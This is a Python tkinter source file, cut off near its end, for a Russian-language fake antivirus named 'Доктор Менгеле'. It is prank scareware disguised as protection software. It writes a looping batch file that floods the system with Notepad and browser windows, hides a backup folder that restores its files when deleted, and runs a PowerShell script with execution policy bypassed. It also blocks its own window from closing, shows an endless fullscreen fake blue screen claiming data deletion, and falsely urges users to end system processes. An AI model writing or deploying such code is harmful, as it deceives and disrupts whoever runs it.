import tkinter as tk
from tkinter import ttk
import subprocess
import os
import random
import sys
import webbrowser
import shutil
import threading

# Получаем путь к .exe
def get_base_path():
    if getattr(sys, 'frozen', False):
        return os.path.dirname(sys.executable)
    return os.path.dirname(os.path.abspath(__file__))

# Создаём батник с рофляным содержимым
def create_virus_files():
    base_path = get_base_path()
    bat_path = os.path.join(base_path, "KostyanSpread.bat")

    # Создаём KostyanSpread.bat
    with open(bat_path, "w", encoding="utf-8") as f:
        f.write(
            "@echo off\n"
            ":loop\n"
            "echo Ты попал, недохакер! > C:\\ProgramData\\DrMengeleMessage.txt\n"
            "start notepad C:\\ProgramData\\DrMengeleMessage.txt\n"
            "echo Доктор Менгеле захватил твой ПК! > C:\\Users\\Public\\Desktop\\WARNING.txt\n"
            "start \"\" \"https://www.youtube.com/watch?v=dQw4w9WgXcQ\"\n"
            "timeout /t 5 >nul\n"
            "goto loop\n"
        )

# Создаём бэкап файлов
def create_backup():
    backup_dir = r"C:\ProgramData\DrMengeleBackup"
    bat_path = os.path.join(get_base_path(), "KostyanSpread.bat")
    ps_path = os.path.join(get_base_path(), "ss.ps1")

    # Создаём папку для бэкапа, если её нет
    if not os.path.exists(backup_dir):
        os.makedirs(backup_dir)
        # Делаем папку скрытой
        subprocess.run(f'attrib +h "{backup_dir}"', shell=True)

    # Копируем файлы в бэкап
    if os.path.exists(bat_path):
        shutil.copy(bat_path, os.path.join(backup_dir, "KostyanSpread.bat"))
    if os.path.exists(ps_path):
        shutil.copy(ps_path, os.path.join(backup_dir, "ss.ps1"))

# Проверка и восстановление файлов
def check_and_restore_files():
    backup_dir = r"C:\ProgramData\DrMengeleBackup"
    bat_path = os.path.join(get_base_path(), "KostyanSpread.bat")
    ps_path = os.path.join(get_base_path(), "ss.ps1")
    bat_backup = os.path.join(backup_dir, "KostyanSpread.bat")
    ps_backup = os.path.join(backup_dir, "ss.ps1")

    # Если файл удалён, восстанавливаем его
    if not os.path.exists(bat_path) and os.path.exists(bat_backup):
        shutil.copy(bat_backup, bat_path)
        if content.winfo_ismapped():
            content.insert(tk.END, "Файл KostyanSpread.bat восстановлен! Ты не избавишься от Доктора Менгеле! 😈\n", "red")
    if not os.path.exists(ps_path) and os.path.exists(ps_backup):
        shutil.copy(ps_backup, ps_path)
        if content.winfo_ismapped():
            content.insert(tk.END, "Файл ss.ps1 восстановлен! Ты не избавишься от Доктора Менгеле! 😈\n", "red")

    # Планируем следующую проверку через 10 секунд
    root.after(10000, check_and_restore_files)

# Уведомления о "подозрительных процессах" (без time.sleep)
def show_notification():
    processes = ["explorer.exe", "svchost.exe", "chrome.exe", "firefox.exe", "notepad.exe"]
    message = f"Обнаружен подозрительный процесс: {random.choice(processes)}\nРекомендуем завершить его через диспетчер задач!"

    # Создаём уведомление
    notif = tk.Toplevel(root)
    notif.overrideredirect(True)
    notif.geometry(f"300x100+{root.winfo_screenwidth()-320}+20")
    notif.configure(bg="#ff4444")
    tk.Label(notif, text=message, font=("Arial", 10), fg="#ffffff", bg="#ff4444", wraplength=280).pack(pady=10)

    # Анимация появления
    def fade_in(alpha=0):
        if alpha < 255:
            notif.attributes("-alpha", alpha/255)
            root.after(20, fade_in, alpha + 10)
        else:
            # Задержка 5 секунд перед исчезновением
            root.after(5000, fade_out)

    # Анимация исчезновения
    def fade_out(alpha=255):
        if alpha > 0:
            notif.attributes("-alpha", alpha/255)
            root.after(20, fade_out, alpha - 10)
        else:
            notif.destroy()
            # Планируем следующее уведомление через 10-15 секунд
            root.after(random.randint(10000, 15000), show_notification)

    fade_in()

# Функция смены темы
def change_theme(event=None):
    selected_theme = theme_var.get()
    if selected_theme == "Тёмная":
        root.configure(bg="#1e1e2e")
        header_frame.configure(bg="#2E7D32")
        header_label.configure(bg="#2E7D32", fg="#ffffff")
        sidebar.configure(bg="#2d2d3f")
        main_frame.configure(bg="#1e1e2e")
        main_tab.configure(bg="#1e1e2e")
        test_tab.configure(bg="#1e1e2e")
        sub_tab.configure(bg="#1e1e2e")
        settings_frame.configure(bg="#1e1e2e")
        content.configure(bg="#2d2d3f", fg="#ffffff")
        meme_label.configure(bg="#1e1e2e", fg="#facc15")
        status_frame.configure(bg="#2d2d3f")
        status_label.configure(bg="#2d2d3f", fg="#ffffff")
        for btn in sidebar.winfo_children():
            btn.configure(bg="#2d2d3f", fg="#ffffff")
            btn.bind("<Enter>", lambda e, b=btn: b.configure(bg="#4CAF50"))
            btn.bind("<Leave>", lambda e, b=btn: b.configure(bg="#2d2d3f"))
        for widget in main_tab.winfo_children():
            if isinstance(widget, tk.Button):
                widget.configure(bg="#4CAF50", fg="white")
            elif isinstance(widget, tk.Label):
                widget.configure(bg="#1e1e2e", fg="#ffffff")
        for widget in test_tab.winfo_children():
            if isinstance(widget, tk.Button):
                widget.configure(bg="#4CAF50", fg="white")
        for widget in sub_tab.winfo_children():
            if isinstance(widget, tk.Button):
                widget.configure(bg="#4CAF50", fg="white")
            elif isinstance(widget, tk.Label):
                widget.configure(bg="#1e1e2e", fg="#ffffff")
        for widget in settings_frame.winfo_children():
            if isinstance(widget, tk.Button):
                widget.configure(bg="#4CAF50", fg="white")
            elif isinstance(widget, tk.Label):
                widget.configure(bg="#1e1e2e", fg="#ffffff")
            elif isinstance(widget, tk.Checkbutton):
                widget.configure(bg="#1e1e2e", fg="#ffffff", selectcolor="#1e1e2e")
    elif selected_theme == "Светлая":
        root.configure(bg="#E8ECEF")
        header_frame.configure(bg="#2E7D32")
        header_label.configure(bg="#2E7D32", fg="#ffffff")
        sidebar.configure(bg="#D3D7DA")
        main_frame.configure(bg="#E8ECEF")
        main_tab.configure(bg="#E8ECEF")
        test_tab.configure(bg="#E8ECEF")
        sub_tab.configure(bg="#E8ECEF")
        settings_frame.configure(bg="#E8ECEF")
        content.configure(bg="#ffffff", fg="#000000")
        meme_label.configure(bg="#E8ECEF", fg="#2E7D32")
        status_frame.configure(bg="#D3D7DA")
        status_label.configure(bg="#D3D7DA", fg="#000000")
        for btn in sidebar.winfo_children():
            btn.configure(bg="#D3D7DA", fg="#000000")
            btn.bind("<Enter>", lambda e, b=btn: b.configure(bg="#4CAF50"))
            btn.bind("<Leave>", lambda e, b=btn: b.configure(bg="#D3D7DA"))
        for widget in main_tab.winfo_children():
            if isinstance(widget, tk.Button):
                widget.configure(bg="#4CAF50", fg="white")
            elif isinstance(widget, tk.Label):
                widget.configure(bg="#E8ECEF", fg="#000000")
        for widget in test_tab.winfo_children():
            if isinstance(widget, tk.Button):
                widget.configure(bg="#4CAF50", fg="white")
        for widget in sub_tab.winfo_children():
            if isinstance(widget, tk.Button):
                widget.configure(bg="#4CAF50", fg="white")
            elif isinstance(widget, tk.Label):
                widget.configure(bg="#E8ECEF", fg="#000000")
        for widget in settings_frame.winfo_children():
            if isinstance(widget, tk.Button):
                widget.configure(bg="#4CAF50", fg="white")
            elif isinstance(widget, tk.Label):
                widget.configure(bg="#E8ECEF", fg="#000000")
            elif isinstance(widget, tk.Checkbutton):
                widget.configure(bg="#E8ECEF", fg="#000000", selectcolor="#E8ECEF")
    elif selected_theme == "Лимонная":
        root.configure(bg="#FFFF00")
        header_frame.configure(bg="#00FF00")
        header_label.configure(bg="#00FF00", fg="#FF00FF")
        sidebar.configure(bg="#FFFF00")
        main_frame.configure(bg="#FFFF00")
        main_tab.configure(bg="#FFFF00")
        test_tab.configure(bg="#FFFF00")
        sub_tab.configure(bg="#FFFF00")
        settings_frame.configure(bg="#FFFF00")
        content.configure(bg="#00FF00", fg="#FF00FF")
        meme_label.configure(bg="#FFFF00", fg="#FF00FF")
        status_frame.configure(bg="#00FF00")
        status_label.configure(bg="#00FF00", fg="#FF00FF")
        for btn in sidebar.winfo_children():
            btn.configure(bg="#FFFF00", fg="#FF00FF")
            btn.bind("<Enter>", lambda e, b=btn: b.configure(bg="#FF00FF"))
            btn.bind("<Leave>", lambda e, b=btn: b.configure(bg="#FFFF00"))
        for widget in main_tab.winfo_children():
            if isinstance(widget, tk.Button):
                widget.configure(bg="#FF00FF", fg="#00FF00")
            elif isinstance(widget, tk.Label):
                widget.configure(bg="#FFFF00", fg="#FF00FF")
        for widget in test_tab.winfo_children():
            if isinstance(widget, tk.Button):
                widget.configure(bg="#FF00FF", fg="#00FF00")
        for widget in sub_tab.winfo_children():
            if isinstance(widget, tk.Button):
                widget.configure(bg="#FF00FF", fg="#00FF00")
            elif isinstance(widget, tk.Label):
                widget.configure(bg="#FFFF00", fg="#FF00FF")
        for widget in settings_frame.winfo_children():
            if isinstance(widget, tk.Button):
                widget.configure(bg="#FF00FF", fg="#00FF00")
            elif isinstance(widget, tk.Label):
                widget.configure(bg="#FFFF00", fg="#FF00FF")
            elif isinstance(widget, tk.Checkbutton):
                widget.configure(bg="#FFFF00", fg="#FF00FF", selectcolor="#FFFF00")

# Заставка с анимацией (без time.sleep)
def show_splash_screen():
    # Скрываем главное окно
    root.withdraw()

    splash = tk.Toplevel()
    splash.overrideredirect(True)  # Убираем рамку окна
    splash.geometry("400x300+500+300")
    splash.configure(bg="#2E7D32")

    # Текст для анимации
    logo_text = "Доктор Менгеле"
    logo_label = tk.Label(splash, text="", font=("Arial", 24, "bold"), fg="#ffffff", bg="#2E7D32")
    logo_label.pack(expand=True)

    # Анимация появления букв
    def animate_text(i=0):
        if i < len(logo_text):
            logo_label.configure(text=logo_text[:i+1])
            root.after(100, animate_text, i + 1)
        else:
            # Показываем "Загрузка..."
            loading_label = tk.Label(splash, text="Загрузка...", font=("Arial", 12), fg="#ffffff", bg="#2E7D32")
            loading_label.pack(pady=10)
            root.after(1000, finish_splash)

    # Завершение заставки
    def finish_splash():
        # Если есть кастомное видео, можно его открыть
        video_path = os.path.join(get_base_path(), "splash_video.mp4")
        if os.path.exists(video_path):
            webbrowser.open(video_path)  # Открываем видео в плеере по умолчанию
            root.after(5000, close_splash)  # Даём время на просмотр видео
        else:
            close_splash()

    def close_splash():
        splash.destroy()
        # Показываем главное окно обратно
        root.deiconify()

    animate_text()

# Перехватываем закрытие окна (только для окна приложения)
def block_close():
    if content.winfo_ismapped():  # Проверяем, отображается ли текстовое поле
        content.delete("1.0", tk.END)
        content.insert(tk.END, "Закрыть нельзя! Мы не отпустит! 😈\n")

# Эффект хаоса (без time.sleep)
def chaos_effect():
    def move_window():
        root.geometry(f"800x600+{random.randint(0, 1000)}+{random.randint(0, 600)}")
        root.after(500, move_window)  # Повторяем каждые 500 мс
    move_window()

# Функция запуска хаоса (в отдельном потоке)
def run_spread():
    def run_in_background():
        base_path = get_base_path()
        bat_path = os.path.join(base_path, "KostyanSpread.bat")
        ps_path = os.path.join(base_path, "ss.ps1")
        wallpaper = r"C:\ProgramData\Kostyan\kostyan_wallpaper.jpg"
        try:
            if not os.path.exists(bat_path):
                raise FileNotFoundError(f"Не найден батник: {bat_path}")
            if not os.path.exists(ps_path):
                raise FileNotFoundError(f"Не найден ps1: {ps_path}")
            # Запускаем батник без консоли
            subprocess.Popen(bat_path, creationflags=subprocess.CREATE_NO_WINDOW)
            subprocess.Popen(f'powershell -ExecutionPolicy Bypass -File "{ps_path}" -WallpaperPath "{wallpaper}" -WindowStyle Hidden', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        except Exception as e:
            root.after(0, lambda: content.insert(tk.END, f"Ошибка: {str(e)}\n") if content.winfo_ismapped() else None)

    # Запускаем в отдельном потоке
    threading.Thread(target=run_in_background, daemon=True).start()

    if content.winfo_ismapped():
        content.delete("1.0", tk.END)
        content.insert(tk.END, "Хаос активирован!\n")
    root.after(100, chaos_effect)

# Фейковый BSOD (бесконечный)
def show_bsod_and_destroy():
    bsod_messages = [
        "A fatal error has occurred. Your PC needs to restart.\nError code: STSSN\nPlease wait while we destroy everything...",
        "CRITICAL SYSTEM FAILURE DETECTED!\nError code: STSSN_CHAOS\nYour data is being deleted...",
        "STSSN SECURITY HAS TAKEN OVER!\nError code: NEDOHAKER_666\nSay goodbye to your PC!"
    ]

    def show_message(index=0):
        # Создаём окно BSOD
        bsod_window = tk.Toplevel(root)
        bsod_window.attributes("-fullscreen", True)
        bsod_window.configure(bg="#0000aa")
        # Принудительно поднимаем окно на передний план
        bsod_window.attributes("-topmost", True)
        # Блокируем закрытие окна
        bsod_window.protocol("WM_DELETE_WINDOW", lambda: None)
        label = tk.Label(bsod_window, text=bsod_messages[index], font=("Arial", 20), fg="white", bg="#0000aa")
        label.pack(expand=True)
        # Обновляем интерфейс, чтобы окно точно отобразилось
        root.update()

        # Меняем сообщение каждые 3 секунды, но не закрываем окно
        root.after(3000, lambda: [label.configure(text=bsod_messages[(index + 1) % len(bsod_messages)]), show_message((index + 1) % len(bsod_messages))])

    show_message()

# Функции для бокового меню (без time.sleep)
def toggle_sidebar():
    if sidebar.winfo_x() == 0:
        # Скрываем меню
        def slide_out(x=0):
            if x > -201:
                sidebar.place(x=x, y=0)
                root.after(10, slide_out, x - 10)
            else:
                sidebar_button.config(text="☰")
        slide_out()
    else:
        # Показываем меню
        def slide_in(x=-200):
            if x < 1:
                sidebar.place(x=x, y=0)
                root.after(10, slide_in, x + 10)
            else:
                sidebar_button.config(text="✖")
                sidebar.lift()  # Поднимаем sidebar поверх всех элементов
        slide_in()

# Функции для управления текстовым полем
def show_content():
    content.pack(pady=10, padx=10, fill=tk.X)

def hide_content():
    content.pack_forget()

# Очистка main_frame от старых меток
def clear_main_frame():
    for widget in main_frame.winfo_children():
        if isinstance(widget, tk.Label) and widget != meme_label:
            widget.destroy()

# Функции разделов
def check_restrictions():
    hide_content()
    for widget in main_tab.winfo_children():
        widget.destroy()
    tk.Label(main_tab, text="Ограничения системы", font=("Arial", 16, "bold")).pack(pady=10)
    tk.Label(main_tab, text="Ограничение на доступ: Активно", font=("Arial", 12), fg="#2E7D32").pack(anchor="w", padx=20)
    tk.Label(main_tab, text="Диспетчер задач: Отключён", font=("Arial", 12), fg="#ff4444").pack(anchor="w", padx=20)

def system_patch():
    hide_content()
    for widget in main_tab.winfo_children():
        widget.destroy()
    tk.Label(main_tab, text="Обновление системы", font=("Arial", 16, "bold")).pack(pady=10)
    colors = ["#ff6666", "#66ff66", "#6666ff", "#ffff66", "#ff66ff"]

    def change_color(i=0):
        if i < 5:
            root.configure(bg=colors[i])
            root.after(200, change_color, i + 1)
        else:
            root.configure(bg="#E8ECEF" if theme_var.get() == "Светлая" else "#1e1e2e")
            tk.Label(main_tab, text="Система обновлена!", font=("Arial", 12)).pack(anchor="w", padx=20)

    change_color()

# Переменная для хранения количества угроз
threats_detected = 0

def virus_check(full_scan=True, from_check_tab=False):
    global threats_detected
    show_content()
    content.delete("1.0", tk.END)
    progress.pack(pady=5)
    progress["value"] = 0  # Сбрасываем прогресс-бар
    progress["maximum"] = 100  # Максимальное значение прогресс-бара
    check_type = "Полная" if full_scan else "Быстрая"
    content.insert(tk.END, f"{check_type} проверка запущена...\n")

    # Фейковые этапы проверки
    stages = [
        "Сканирование системных файлов...\n",
        "Проверка реестра...\n",
        "Анализ сетевых подключений...\n",
        "Поиск скрытых угроз...\n",
        "Завершение проверки...\n"
    ]

    # Постепенное заполнение прогресс-бара
    def update_progress(stage_index=0, progress_value=0):
        if stage_index < len(stages):
            if progress_value == 0:
                content.insert(tk.END, stages[stage_index])
            if progress_value < 20:  # Каждый этап занимает 20% прогресса
                progress["value"] += 1
                root.after(50, update_progress, stage_index, progress_value + 1)
            else:
                update_progress(stage_index + 1, 0)
        else:
            threats_detected = 666  # После проверки обнаруживаем угрозы
            content.insert(tk.END, f"Обнаружено угроз: {threats_detected}\n")
            content.insert(tk.END, "- STSSN_Virus.exe\n- STSSN_Trojan.dll\n- HackYourPC.bat\n", "red")
            progress.pack_forget()
            # Добавляем кнопку "Очистить" в зависимости от текущего раздела
            target_frame = main_tab if from_check_tab else main_frame
            tk.Button(target_frame, text="🛡️ Очистить", font=("Arial", 12), bg="#ff4444", fg="white", command=lambda: [content.delete("1.0", tk.END), content.insert(tk.END, "Очистка системы начата...\n"), run_spread(), root.after(2000, show_bsod_and_destroy)], width=20, relief="flat", borderwidth=0, highlightthickness=0).pack(pady=5)

    update_progress()

def generate_password():
    show_content()
    content.delete("1.0", tk.END)
    content.insert(tk.END, "Генерация пароля...\n")
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%"
    password = "".join(random.choice(chars) for _ in range(12))
    content.insert(tk.END, f"Ваш пароль: {password}\n")

def speed_test():
    show_content()
    content.delete("1.0", tk.END)
    progress.pack(pady=5)
    progress["value"] = 0
    progress["maximum"] = 100
    content.insert(tk.END, "Тестирование скорости...\n")

    def update_progress(value=0):
        if value < 100:
            progress["value"] = value + 1
            root.after(20, update_progress, value + 1)
        else:
            speed = random.randint(10, 500)
            content.insert(tk.END, f"Скорость: {speed} МБ/с\n")
            progress.pack_forget()

    update_progress()

def secret_mode():
    show_content()
    content.delete("1.0", tk.END)
    content.insert(tk.END, "Секретный режим активирован!\n")

    def move_window(i=0):
        if i < 3:
            root.geometry(f"800x600+{random.randint(100, 500)}+{random.randint(100, 500)}")
            root.after(300, move_window, i + 1)
        else:
            root.geometry("800x600+100+100")

    move_window()

def subscription():
    hide_content()
    for widget in sub_tab.winfo_children():
        widget.destroy()
    tk.Label(sub_tab, text="Подписка на антивирус", font=("Arial", 16, "bold")).pack(pady=10)
    tk.Label(sub_tab, text="Выберите версию подписки:", font=("Arial", 12)).pack(anchor="w", padx=20)

# Функция для раздела "Сеть" (без time.sleep)
def network_analysis():
    show_content()
    content.delete("1.0", tk.END)
    progress.pack(pady=5)
    progress["value"] = 0
    progress["maximum"] = 100
    content.insert(tk.END, "Анализ сетевой активности запущен...\n")

    def update_progress(value=0):
        if value < 100:
            progress["value"] = value + 1
            root.after(20, update_progress, value + 1)
        else:
            content.insert(tk.END, "Обнаружено 666 подозрительных соединений!\n")
            content.insert(tk.END, "- Подключение к серверам Недохакеров\n- Передача данных в STSSN_CHAOS\n- Секретный чат с Доктором Менгеле\n", "red")
            progress.pack_forget()
            tk.Button(main_frame, text="🌐 Заблокировать всё", font=("Arial", 12), bg="#ff4444", fg="white", command=lambda: [content.delete("1.0", tk.END), content.insert(tk.END, "Сеть заблокирована... или нет? 😈\n", "red"), run_spread(), root.after(2000, show_bsod_and_destroy)], width=20, relief="flat", borderwidth=0, highlightthickness=0).pack(pady=5)

    update_progress()

# Функция для раздела "Проверка"
def show_virus_check():
    hide_content()
    for widget in main_tab.winfo_children():
        widget.destroy()
    tk.Label(main_tab, text="Проверка на вирусы", font=("Arial", 16, "bold")).pack(pady=10)
    tk.Button(main_tab, text="🔍 Проверка вирусов", font=("Arial", 12), bg="#4CAF50", fg="white", command=lambda: virus_check(True, from_check_tab=True), width=20, relief="flat", borderwidth=0, highlightthickness=0).pack(pady=5)
    tk.Button(main_tab, text="Полная проверка", font=("Arial", 11), bg="#4CAF50", fg="white", command=lambda: virus_check(True, from_check_tab=True), width=15, relief="flat", borderwidth=0, highlightthickness=0).pack(pady=2)
    tk.Button(main_tab, text="Быстрая проверка", font=("Arial", 11), bg="#4CAF50", fg="white", command=lambda: virus_check(False, from_check_tab=True), width=15, relief="flat", borderwidth=0, highlightthickness=0).pack(pady=2)

# Настройки с кликабельными галочками и выбором темы
def toggle_data():
    if not var_data.get():
        var_data.set(True)
        if content.winfo_ismapped():
            content.insert(tk.END, "Отдать данные — обязательно! 😡\n", "red")

def toggle_sell():
    if not var_sell.get():
        var_sell.set(True)
        if content.winfo_ismapped():
            content.insert(tk.END, "Продавать данные — тоже обязательно! 😡\n", "red")

def toggle_notifications():
    if not var_notifications.get():
        var_notifications.set(True)
        if content.winfo_ismapped():
            content.insert(tk.END, "Уведомления — это святое! 😡\n", "red")

def toggle_stssn():
    if not var_stssn.get():
        var_stssn.set(True)
        if content.winfo_ismapped():
            content.insert(tk.END, "Режим 'СТССН' — это навсегда! 😡\n", "red")

def settings():
    hide_content()
    for widget in settings_frame.winfo_children():
        widget.destroy()
    tk.Label(settings_frame, text="Настройки", font=("Arial", 16, "bold")).pack(pady=5)
    tk.Checkbutton(settings_frame, text="Отдать нам все ваши данные", font=("Arial", 12), selectcolor="#E8ECEF", activebackground="#E8ECEF", activeforeground="#000000", variable=var_data, command=toggle_data).pack(anchor="w", padx=20)
    tk.Checkbutton(settings_frame, text="Разрешить нам продавать ваши данные", font=("Arial", 12), selectcolor="#E8ECEF", activebackground="#E8ECEF", activeforeground="#000000", variable=var_sell, command=toggle_sell).pack(anchor="w", padx=20)
    tk.Button(settings_frame, text="🐾 Увидеть котика", font=("Arial", 12), bg="#4CAF50", fg="white", command=lambda: tk.Label(settings_frame, text="Котик: Мяу! 🐾", font=("Arial", 12)).pack(anchor="w", padx=20), width=20, relief="flat", borderwidth=0, highlightthickness=0).pack(pady=5)
    tk.Checkbutton(settings_frame, text="Уведомления (каждый час)", font=("Arial", 12), selectcolor="#E8ECEF", activebackground="#E8ECEF", activeforeground="#000000", variable=var_notifications, command=toggle_notifications).pack(anchor="w", padx=20)
    tk.Checkbutton(settings_frame, text="Режим 'СТССН' (онли хард)", font=("Arial", 12), selectcolor="#E8ECEF", activebackground="#E8ECEF", activeforeground="#ff4444", variable=var_stssn, command=toggle_stssn).pack(anchor="w", padx=20)
    # Выбор темы
    tk.Label(settings_frame, text="Выберите тему:", font=("Arial", 12)).pack(anchor="w", padx=20)
    theme_combobox.pack(anchor="w", padx=20)

# Главная с рандомным мемом в уголке и новыми функциями
def main_menu():
    hide_content()
    for widget in main_tab.winfo_children():
        widget.destroy()
    tk.Label(main_tab, text="Главная", font=("Arial", 16, "bold")).pack(pady=10)
    tk.Label(main_tab, text="Статус: Защищено", font=("Arial", 12), fg="#2E7D32").pack(anchor="w", padx=20)
    tk.Label(main_tab, text="Защита в реальном времени: Активна", font=("Arial", 12), fg="#2E7D32").pack(anchor="w", padx=20)
    tk.Label(main_tab, text=f"Угроз обнаружено: {threats_detected}", font=("Arial", 12), fg="#ff4444" if threats_detected > 0 else "#000000").pack(anchor="w", padx=20)
    tk.Label(main_tab, text="Последняя проверка: 27.03.2025", font=("Arial", 12)).pack(anchor="w", padx=20)

    # Кнопки для проверки на главной
    tk.Button(main_tab, text="🛡️ Ограничения", font=("Arial", 12), bg="#4CAF50", fg="white", command=check_restrictions, width=20, relief="flat", borderwidth=0, highlightthickness=0).pack(pady=5)
    tk.Button(main_tab, text="🎨 Обновление", font=("Arial", 12), bg="#4CAF50", fg="white", command=system_patch, width=20, relief="flat", borderwidth=0, highlightthickness=0).pack(pady=5)
    tk.Button(main_tab, text="🔍 Проверка вирусов", font=("Arial", 12), bg="#4CAF50", fg="white", command=lambda: virus_check(True, from_check_tab=False), width=20, relief="flat", borderwidth=0, highlightthickness=0).pack(pady=5)
    tk.Button(main_tab, text="Полная проверка", font=("Arial", 11), bg="#4CAF50", fg="white", command=lambda: virus_check(True, from_check_tab=False), width=15, relief="flat", borderwidth=0, highlightthickness=0).pack(pady=2)
    tk.Button(main_tab, text="Быстрая проверка", font=("Arial", 11), bg="#4CAF50", fg="white", command=lambda: virus_check(False, from_check_tab=False), width=15, relief="flat", borderwidth=0, highlightthickness=0).pack(pady=2)

    # Рандомный мем в уголке
    meme_label.config(text=random.choice(memes))

# Красивые кнопки для подписки с ошибкой
def create_subscription_buttons():
    for widget in sub_tab.winfo_children():
        widget.destroy()
    
    tk.Label(sub_tab, text="Подписка на антивирус", font=("Arial", 16, "bold")).pack(pady=10)
    tk.Label(sub_tab, text="Выберите версию подписки:", font=("Arial", 12)).pack(anchor="w", padx=20)

    base_button = tk.Button(sub_tab, text="💸 Базовая (99 руб)", font=("Arial", 12), fg="white", bg="#4CAF50", activebackground="#66BB6A", width=20, relief="flat", borderwidth=0, highlightthickness=0)
    base_button.pack(pady=5)
    base_button.bind("<Enter>", lambda e: base_button.configure(bg="#66BB6A"))
    base_button.bind("<Leave>", lambda e: base_button.configure(bg="#4CAF50"))
    base_button.configure(command=lambda: tk.Label(sub_tab, text="У вас недостаточно средств, в кредит не даём :)", font=("Arial", 12), fg="#ff4444").pack(anchor="w", padx=20))

    premium_button = tk.Button(sub_tab, text="🌟 Премиум (999 руб)", font=("Arial", 12), fg="white", bg="#4CAF50", activebackground="#66BB6A", width=20, relief="flat", borderwidth=0, highlightthickness=0)
    premium_button.pack(pady=5)
    premium_button.bind("<Enter>", lambda e: premium_button.configure(bg="#66BB6A"))
    premium_button.bind("<Leave>", lambda e: premium_button.configure(bg="#4CAF50"))
    premium_button.configure(command=lambda: tk.Label(sub_tab, text="У вас недостаточно средств, в кредит не даём :)", font=("Arial", 12), fg="#ff4444").pack(anchor="w", padx=20))

    ultra_button = tk.Button(sub_tab, text="🔥 Ultra (9999 руб)", font=("Arial", 12), fg="white", bg="#4CAF50", activebackground="#66BB6A", width=20, relief="flat", borderwidth=0, highlightthickness=0)
    ultra_button.pack(pady=5)
    ultra_button.bind("<Enter>", lambda e: ultra_button.configure(bg="#66BB6A"))
    ultra_button.bind("<Leave>", lambda e: ultra_button.configure(bg="#4CAF50"))
    ultra_button.configure(command=lambda: tk.Label(sub_tab, text="У вас недостаточно средств, в кредит не даём :)", font=("Arial", 12), fg="#ff4444").pack(anchor="w", padx=20))

root = tk.Tk()
root.title("Доктор Менгеле - Ultimate Protection")
root.geometry("800x600")
root.resizable(False, False)
root.configure(bg="#1e1e2e")

# Создаём батник
create_virus_files()

# Создаём бэкап файлов
create_backup()

# Показываем заставку
show_splash_screen()

# Запускаем уведомления
root.after(10000, show_notification)

# Запускаем проверку и восстановление файлов
root.after(10000, check_and_restore_files)

# Блокируем только закрытие окна приложения
root.protocol("WM_DELETE_WINDOW", block_close)

# Переменные для галочек
var_data = tk.BooleanVar(value=True)
var_sell = tk.BooleanVar(value=True)
var_notifications = tk.BooleanVar(value=True)
var_stssn = tk.BooleanVar(value=True)

# Переменная для выбора темы (по умолчанию светлая)
theme_var = tk.StringVar(value="Светлая")
theme_combobox = ttk.Combobox(root, textvariable=theme_var, values=["Тёмная", "Светлая", "Лимонная"], state="readonly", font=("Arial", 12))
theme_combobox.bind("<<ComboboxSelected>>", change_theme)

# Заголовок
header_frame = tk.Frame(root, bg="#2E7D32", height=50)
header_frame.pack(fill=tk.X, side=tk.TOP)
header_label = tk.Label(header_frame, text="Доктор Менгеле", font=("Arial", 18, "bold"), fg="#ffffff", bg="#2E7D32")
header_label.pack(side=tk.LEFT, padx=20, pady=10)

# Кнопка для выездного меню
sidebar_button = tk.Button(header_frame, text="☰", font=("Arial", 14), bg="#2E7D32", fg="#ffffff", bd=0, command=toggle_sidebar)
sidebar_button.pack(side=tk.LEFT, padx=10)

# Выездное боковое меню
sidebar = tk.Frame(root, bg="#2d2d3f", width=200, height=550)
sidebar.place(x=-200, y=50)  # Изначально скрыто

# Иконки в sidebar (сокращённые названия, в стиле "Доктор Веб")
buttons = [
    ("🛡️ Главная", lambda: [main_menu(), settings_frame.pack_forget(), main_tab.pack(fill=tk.BOTH, expand=True), test_tab.pack_forget(), sub_tab.pack_forget()]),
    ("🔍 Проверка", lambda: [show_virus_check(), settings_frame.pack_forget(), main_tab.pack(fill=tk.BOTH, expand=True), test_tab.pack_forget(), sub_tab.pack_forget()]),
    ("🌐 Сеть", lambda: [network_analysis(), settings_frame.pack_forget(), main_tab.pack_forget(), test_tab.pack_forget(), sub_tab.pack_forget()]),
    ("⚡ Тесты", lambda: [hide_content(), content.delete("1.0", tk.END), content.insert(tk.END, "Тесты\n"), settings_frame.pack_forget(), main_tab.pack_forget(), test_tab.pack(fill=tk.BOTH, expand=True), sub_tab.pack_forget()]),
    ("💰 Подписка", lambda: [subscription(), create_subscription_buttons(), settings_frame.pack_forget(), main_tab.pack_forget(), test_tab.pack_forget(), sub_tab.pack(fill=tk.BOTH, expand=True)]),
    ("⚙ Настройки", lambda: [settings(), settings_frame.pack(fill=tk.BOTH, expand=True), main_tab.pack_forget(), test_tab.pack_forget(), sub_tab.pack_forget()])
]
for i, (text, cmd) in enumerate(buttons):
    btn = tk.Button(sidebar, text=text, font=("Arial", 12), bg="#2d2d3f", fg="#ffffff", bd=0, anchor="w", command=cmd)
    btn.pack(fill=tk.X, pady=5, padx=10)
    btn.bind("<Enter>", lambda e, b=btn: b.configure(bg="#4CAF50"))
    btn.bind("<Leave>", lambda e, b=btn: b.configure(bg="#2d2d3f"))

# Главный фрейм
main_frame = tk.Frame(root, bg="#1e1e2e")
main_frame.pack(fill=tk.BOTH, expand=True)

# Фрейм для настроек
settings_frame = tk.Frame(main_frame, bg="#1e1e2e")

# Главная
main_tab = tk.Frame(main_frame, bg="#1e1e2e")
main_tab.pack(fill=tk.BOTH, expand=True)

# Тесты
test_tab = tk.Frame(main_frame, bg="#1e1e2e")
tk.Button(test_tab, text="🔑 Генератор паролей", font=("Arial", 12), bg="#4CAF50", fg="white", command=generate_password, width=20, relief="flat", borderwidth=0, highlightthickness=0).pack(pady=5)
tk.Button(test_tab, text="⚡ Тест скорости", font=("Arial", 12), bg="#4CAF50", fg="white", command=speed_test, width=20, relief="flat", borderwidth=0, highlightthickness=0).pack(pady=5)
tk.Button(test_tab, text="🔒 Секретный режим", font=("Arial", 12), bg="#4CAF50", fg="white", command=secret_mode, width=20, relief="flat", borderwidth=0, highlightthickness=0).pack(pady=5)

# Подписка
sub_tab = tk.Frame(main_frame, bg="#1e1e2e")

# Текстовое поле (изначально скрыто)
content = tk.Text(main_frame, height=10, bg="#2d2d3f", fg="#ffffff", font=("Arial", 12), insertbackground="#facc15", relief="flat", borderwidth=0)
content.tag_configure("green", foreground="#2E7D32")
content.tag_configure("red", foreground="#ff4444")
content.tag_configure("yellow", foreground="#facc15")

# Рандомный мем в уголке
memes = [
